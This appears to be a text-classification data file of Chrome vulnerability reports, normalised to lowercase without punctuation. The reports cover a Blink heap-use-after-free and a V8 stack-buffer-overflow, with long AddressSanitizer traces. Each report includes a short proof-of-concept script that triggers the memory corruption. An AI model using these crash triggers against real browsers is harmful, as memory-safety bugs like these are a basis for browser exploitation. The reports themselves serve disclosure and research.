base/bind_internal.h:185 14 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:557 15 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 16 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 17 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 18 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 19 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 20 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:298 21 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:235 22 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 23 in run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:789 24 in contentmain mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19 25 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66 26 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 64 bytes inside of 104-byte region freed by thread t0 chrome here 0 in operator delete void 1 in deleteptr mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/ownptrcommon.h:52 discriminator 1 2 in removedetachedchildrenincontainer mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:467 discriminator 1 3 in removedetachedchildren mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/containernode.cpp:84 4 in blink htmlhtmlelement htmlhtmlelement mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/htmlhtmlelement.h:31 5 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:272 6 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:695 7 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1121 8 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:844 9 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 10 in idlenotification mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6716 11 in didcommit mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/gpu/render_widget_compositor.cc:898 12 in beginmainframe mnt/data/b/build/slave/asan_release/build/src/out/release cc/trees/thread_proxy.cc:830 13 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:185 14 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/bind_internal.h:557 15 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 16 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 17 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 18 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 19 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 20 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:298 21 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:235 22 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 23 in run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:789 24 in contentmain mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19 25 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66 26 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 previously allocated by thread t0 chrome here 0 in operator new unsigned long 1 in create mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.h:43 2 in scriptconstructor mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:1006 3 in createhtmlelement mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/core/htmlelementfactory.cpp:1250 4 in createelement mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:779 5 in createelement1methodformainworld mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:3634 6 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 7 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1139 8 unknown module 9 unknown module 10 unknown module 11 unknown module 12 unknown module 8 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:103 9 in run mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:1609 10 in runcompiledscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:340 11 in executescriptandreturnvalue mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:202 discriminator 3 12 in execute mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scheduledaction.cpp:118 13 in fired mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/domtimer.cpp:164 14 in sharedtimerfiredinternal mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:137 15 in sharedtimerfired mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/platform/threadtimers.cpp:107 16 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 17 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 18 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 19 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 20 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:36 21 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 22 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:298 23 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:235 24 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 22594==aborting version chrome version asan-symbolized-linux-release-307759 reproduction case attached as crash.zip for crashes please include the following additional information type of crash tab	11
heap-use-after-free in blink treescopeeventcontext ensureeventpath vulnerability details the following testcase requires the js-flags expose-gc flag it crashes the latest asan build of chrome as follows 3008==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in rootnode mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/rawptr.h:118 1 in path mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/event.cpp:251 2 in pathattributegetter mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8event.cpp:236 3 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:87 4 in getpropertywithaccessor mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/objects.cc:445 5 in load mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/ic/ic.cc:773 6 in rt_impl_loadic_miss mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/ic/ic.cc:2340 discriminator 1 7 unknown module 8 unknown module 9 unknown module 10 unknown module 7 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:103 8 in run mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:1609 9 in runcompiledscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:340 10 in executescriptandreturnvalue mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:202 discriminator 3 11 in evaluatescriptinmainworld mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:618 12 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:586 13 in executescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:371 14 in preparescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:267 15 in runscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:348 16 in execute mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:210 17 in runscriptsforpausedtreebuilder mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:286 18 in processparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:461 19 in pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:517 20 in didreceiveparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:338 21 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:88 discriminator 4 22 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:513 23 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 24 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 25 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 26 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 27 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 28 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:298 29 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:235 30 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 31 in run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:789 32 in contentmain mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19 33 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66 34 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 96 bytes inside of 2704-byte region freed by thread t0 chrome here 0 in interceptor_free 1 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:272 2 in postgarbagecollectionprocessing mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/global-handles.cc:695 3 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1121 4 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:844 5 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 6 in requestgarbagecollectionfortesting mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6489 7 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 8 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1139 9 unknown module 10 unknown module 11 unknown module 12 unknown module 9 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:103 10 in run mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:1609 11 in runcompiledscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:340 12 in executescriptandreturnvalue mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:202 discriminator 3 13 in evaluatescriptinmainworld mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:618 14 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:586 15 in executescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:371 16 in preparescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:267 17 in runscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:348 18 in execute mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:210 19 in runscriptsforpausedtreebuilder mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:286 20 in processparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:461 21 in pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:517 22 in didreceiveparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:338 23 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:88 discriminator 4 24 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:513 25 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 previously allocated by thread t0 chrome here 0 in interceptor_malloc 1 in partitionalloc mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/partitionalloc.h:477 2 in create mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/xmldocument.h:39 3 in createdocumentmethod mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8domimplementation.cpp:120 4 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 5 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1139 6 unknown module 7 unknown module 8 unknown module 9 unknown module 6 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:103 7 in run mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:1609 8 in runcompiledscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:340 9 in executescriptandreturnvalue mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:202 discriminator 3 10 in evaluatescriptinmainworld mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:618 11 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:586 12 in executescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:371 13 in preparescript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/scriptloader.cpp:267 14 in runscript mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:348 15 in execute mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:210 16 in runscriptsforpausedtreebuilder mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:286 17 in processparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:461 18 in pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:517 19 in didreceiveparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:338 20 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:88 discriminator 4 21 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:513 22 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 23 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 24 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 25 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 3008==aborting version chrome version asan-linux-release-308523 reproduction case script o76=document.implementation.createdocumenttype doc w3c//dtd xhtml 1.0 transitional//en o77=document.implementation.createdocument o97=o76.ownerdocument.createelement iframe delete o76 delete o77 o106=document.createevent mouseevents o106.initmouseevent click true true window,0 0 0 0 0 false false false false 0 null o97.dispatchevent o106 o140=document.documentelement o140.appendchild o97 gc o106.path script for crashes please include the following additional information type of crash tab	11
stack-buffer-overflow in v8 internal markcompactcollector sweepinparallel vulnerability details the following testcase require the js-flags expose-gc flag and might require a few reloads it crashes the latest chrome asan build as follows during minimising i have also seen global-buffer-overflows so i suspect a wild memory access maybe a v8 issue 22704==error addresssanitizer stack-buffer-overflow on address at pc bp sp write of size 16 at thread t9 workerpool/2272 0 in markwordtoobjectstarts mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/mark-compact.cc:4014 1 in sweepinparallel mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/mark-compact.cc:4030 2 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 3 in threadfunc mnt/data/b/build/slave/asan_release/build/src/out/release base/threading/platform_thread_posix.cc:80 4 in start_thread build/buildd/eglibc-2.19/nptl/pthread_create.c:312 discriminator 2 address is located in stack of thread t9 workerpool/2272 at offset 99 in frame 0 in sweepinparallel mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/mark-compact.cc:4042 this frame has 2 object s 32 96 offsets.i memory access at offset 99 overflows this variable 128 400 private_free_list hint this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext longjmp and c exceptions are supported thread t9 workerpool/2272 created by t0 chrome here 0 in interceptor_pthread_create 1 in createthread mnt/data/b/build/slave/asan_release/build/src/out/release base/threading/platform_thread_posix.cc:120 2 in createnonjoinable mnt/data/b/build/slave/asan_release/build/src/out/release base/threading/platform_thread_posix.cc:224 3 in addtask mnt/data/b/build/slave/asan_release/build/src/out/release base/threading/worker_pool_posix.cc:172 4 in posttask mnt/data/b/build/slave/asan_release/build/src/out/release base/threading/worker_pool_posix.cc:153 5 in callonbackgroundthread mnt/data/b/build/slave/asan_release/build/src/out/release gin/v8_platform.cc:31 6 in startsweeperthreads mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/mark-compact.cc:467 7 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/mark-compact.cc:318 8 in markcompact mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1209 9 in performgarbagecollection mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:1096 10 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap.cc:844 11 in collectgarbage mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/heap/heap-inl.h:583 12 in requestgarbagecollectionfortesting mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:6489 13 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/arguments.cc:33 14 in handleapicallhelper false mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/builtins.cc:1139 15 unknown module 16 unknown module 17 unknown module 18 unknown module 19 unknown module 15 in invoke mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/execution.cc:103 16 in call mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/api.cc:4170 17 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:387 18 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:170 19 in call mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8mutationcallback.cpp:76 20 in deliver mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/mutationobserver.cpp:236 21 in delivermutations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/mutationobserver.cpp:267 22 in microtaskfunctioncallback mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/microtask.cpp:67 23 in runmicrotasks mnt/data/b/build/slave/asan_release/build/src/out/release v8/src/isolate.cc:2496 24 in performcheckpoint mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/microtask.cpp:54 25 in didleavescriptcontext mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8recursionscope.cpp:41 26 in v8recursionscope mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8recursionscope.h:75 27 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:170 28 in callfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:154 discriminator 3 29 in calllistenerfunction mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:99 30 in invokeeventhandler mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:128 31 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:98 32 in handleevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/bindings/core/v8/v8lazyeventlistener.cpp:117 33 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:352 34 in fireeventlisteners mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/events/eventtarget.cpp:288 35 in dispatchevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1678 36 in dispatchloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:1646 37 in dispatchwindowloadevent mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/frame/localdomwindow.cpp:487 38 in implicitclose mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:2533 39 in checkcompleted mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:501 40 in finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/loader/frameloader.cpp:431 41 in finishedparsing mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/dom/document.cpp:4644 42 in end mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:808 43 in processparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:469 44 in pumppendingspeculations mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:517 45 in didreceiveparsedchunkfrombackgroundparser mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:338 46 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:88 discriminator 4 47 in operator mnt/data/b/build/slave/asan_release/build/src/out/release third_party/webkit/source/wtf/functional.h:513 48 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/callback.h:396 49 in runtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:436 50 in deferorrunpendingtask mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:446 51 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_pump_default.cc:32 52 in run mnt/data/b/build/slave/asan_release/build/src/out/release base/run_loop.cc:55 53 in base messageloop run mnt/data/b/build/slave/asan_release/build/src/out/release base/message_loop/message_loop.cc:298 54 in renderermain mnt/data/b/build/slave/asan_release/build/src/out/release content/renderer/renderer_main.cc:235 55 in runzygote mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:347 56 in run mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main_runner.cc:789 57 in contentmain mnt/data/b/build/slave/asan_release/build/src/out/release content/app/content_main.cc:19 58 in chromemain mnt/data/b/build/slave/asan_release/build/src/out/release chrome/app/chrome_main.cc:66 59 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 summary addresssanitizer stack-buffer-overflow 0 shadow bytes around the buggy address f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f5 f1 f1 f1 f1 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 22704==aborting version chrome version asan-linux-release-308523 reproduction case script function start o23=document.body o39=new mutationobserver cb_observer_136_1 o39.observe top.o23 childlist true attributes true characterdataoldvalue true o23.style.position='fixed function cb_observer_136_1 arg to=arg.shift gc gc gc script body onload start body for crashes please include the following additional information type of crash tab	11
